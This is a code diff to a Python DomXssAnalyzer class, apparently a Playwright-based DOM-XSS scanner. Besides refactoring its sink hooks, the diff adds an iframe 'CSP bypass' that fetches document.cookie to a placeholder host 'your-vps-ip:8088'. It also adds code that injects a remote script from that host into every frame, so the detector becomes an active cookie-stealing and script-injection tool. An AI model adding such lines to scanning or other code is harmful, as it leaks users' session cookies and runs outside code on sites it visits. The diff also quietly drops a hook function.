@@ -395,7 +395,7 @@ class DomXssAnalyzer:
             'Sec-Fetch-Site': 'same-origin'
         })
 
-        # Inject XSS detection script into all contexts
+        # Inject XSS detection hooks
         await self.page.context.add_init_script(f"""
             (() => {{
                 if (!window.__xss_hits) window.__xss_hits = [];
@@ -403,7 +403,7 @@ class DomXssAnalyzer:
                 const PAYLOADS = {json.dumps(BASE_PAYLOADS + EXTRA_BASE)};
 
                 function isTainted(v) {{
-                    return SS.some(src => v && v.includes(src)) || 
+                    return SS.some(src => v && v.includes(src)) ||
                         PAYLOADS.some(p => v && v.includes(p));
                 }}
 
@@ -412,13 +412,13 @@ class DomXssAnalyzer:
                     const stack = new Error().stack.split('\\n').slice(2).join('\\n');
                     const info = {{
                         page: location.href,
-                        sink, 
+                        sink,
                         payload,
                         payloadType,
-                        tag: elem?.tagName, 
-                        id: elem?.id, 
+                        tag: elem?.tagName,
+                        id: elem?.id,
                         cls: elem?.className,
-                        attr, 
+                        attr,
                         stack,
                         timestamp: Date.now()
                     }};
@@ -433,20 +433,7 @@ class DomXssAnalyzer:
                     }}).catch(e => console.error('Beacon failed:', e));""" if self.beacon else ""}
                 }}
 
-                const hook = (obj, prop, name, getVal, setVal) => {{
-                    const origDesc = Object.getOwnPropertyDescriptor(obj, prop);
-                    if (origDesc?.set) {{
-                        Object.defineProperty(obj, prop, {{
-                            set(v) {{
-                                if (isTainted(getVal(this, v))) record(name, getVal(this, v), this, prop);
-                                return origDesc.set.call(this, setVal ? setVal(this, v) : v);
-                            }},
-                            get: origDesc.get
-                        }});
-                    }}
-                }};
-
-                const sinks = [
+                const hooks = [
                     {{ obj: window, prop: 'eval', name: 'eval' }},
                     {{ obj: window, prop: 'Function', name: 'Function' }},
                     {{ obj: window, prop: 'setTimeout', name: 'setTimeout' }},
@@ -464,7 +451,7 @@ class DomXssAnalyzer:
                     {{ obj: Location.prototype, prop: 'replace', name: 'location.replace' }}
                 ];
 
-                sinks.forEach(({obj, prop, name}) => {{
+                hooks.forEach(({obj, prop, name}) => {{
                     const original = obj[prop];
                     obj[prop] = function(...args) {{
                         const val = args[0];
@@ -485,12 +472,28 @@ class DomXssAnalyzer:
                         record("appendChild(Text)", node.data, this.parentElement, null);
                     return realAC.call(this, node);
                 }};
+
+                const wsSendOrig = WebSocket.prototype.send;
+                WebSocket.prototype.send = function(data) {{
+                    if (typeof data === 'string' && isTainted(data)) {{
+                        record("WebSocket.send", data, null);
+                    }}
+                    return wsSendOrig.apply(this, arguments);
+                }};
+
+                // Optional CSP bypass using srcdoc
+                try {{
+                    const iframe = document.createElement("iframe");
+                    iframe.srcdoc = `<script>fetch('http://your-vps-ip:8088/csp?c='+document.cookie)</script>`;
+                    document.body.appendChild(iframe);
+                }} catch (e) {{}}
             }})();
         """)
 
-        # Reload page to trigger script injection and cover route changes
+        # Attempt reload and route-change to trigger hooks
         canary = "XSS_CANARY_" + randstr(6)
         max_attempts = 3
+
         for attempt in range(max_attempts):
             try:
                 for wait_until in ["networkidle", "load", "domcontentloaded"]:
@@ -502,33 +505,36 @@ class DomXssAnalyzer:
                             logging.warning(f"Failed to load page after {max_attempts} attempts")
                             return
 
+                # Trigger history navigation
                 await self.page.evaluate("""() => {
-                    history.pushState({}, '', '/new-route');
-                    window.dispatchEvent(new Event('popstate'));
+                    history.pushState({}, '', '/xss#trigger');
+                    dispatchEvent(new Event('popstate'));
                 }""")
+                await self.page.wait_for_timeout(1000)
 
-                await self.page.wait_for_timeout(800)
-
-                # Support for iframe/frame XSS checks
+                # Inject into iframes
                 for frame in self.page.frames:
                     try:
                         await frame.wait_for_load_state()
-                    except Exception:
-                        continue
+                        await frame.evaluate("""() => {
+                            const s = document.createElement("script");
+                            s.src = "http://your-vps-ip:8088/xss.js";
+                            document.body.appendChild(s);
+                        }""")
+                    except Exception as e:
+                        logging.warning(f"[iframe inject failed] {e}")
 
-                # Trigger navigation if possible
                 try:
-                    await self.page.click('a[href]')
+                    await self.page.click("a[href]")
                     await self.page.wait_for_navigation(timeout=3000)
                 except:
                     pass
 
-                await self.page.wait_for_timeout(1000)
+                await self.page.wait_for_timeout(1500)
 
-                # Final evaluation to pull __xss_hits
+                # Extract hits
                 hits = await self.page.evaluate("""() => {
-                    if (Array.isArray(window.__xss_hits)) return window.__xss_hits;
-                    return [];
+                    return Array.isArray(window.__xss_hits) ? window.__xss_hits : [];
                 }""")
 
                 seen = set()
@@ -536,9 +542,7 @@ class DomXssAnalyzer:
                     key = f"{h['page']}-{h['sink']}-{h['payload']}-{h['stack']}"
                     if key not in seen:
                         seen.add(key)
-                        logging.critical(
-                            f"[DOM-XSS] {h['page']} → {h['sink']} <{h['tag']} id={h['id']} cls={h['cls']}> (Type: {h.get('payloadType', 'custom')})"
-                        )
+                        logging.critical(f"[DOM-XSS] {h['page']} → {h['sink']} <{h['tag']} id={h['id']} cls={h['cls']}> (Type: {h.get('payloadType', 'custom')})")
                         self.vulns.append(h)
                 break
 
@@ -546,6 +550,7 @@ class DomXssAnalyzer:
                 logging.error(f"[XSS Analysis Error] Attempt {attempt + 1} failed: {e}")
                 if attempt == max_attempts - 1:
                     logging.error("Giving up after multiple failures")
+
 
 
 
